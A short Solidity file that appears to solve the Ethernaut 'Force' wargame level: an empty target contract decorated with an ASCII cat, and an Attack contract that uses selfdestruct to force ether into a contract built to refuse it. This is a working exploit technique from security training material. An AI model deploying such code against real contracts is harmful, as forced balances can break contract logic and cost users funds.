pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }

contract Attack {

    function attack(address target) external payable{
        selfdestruct(payable(address(target)));
    }
}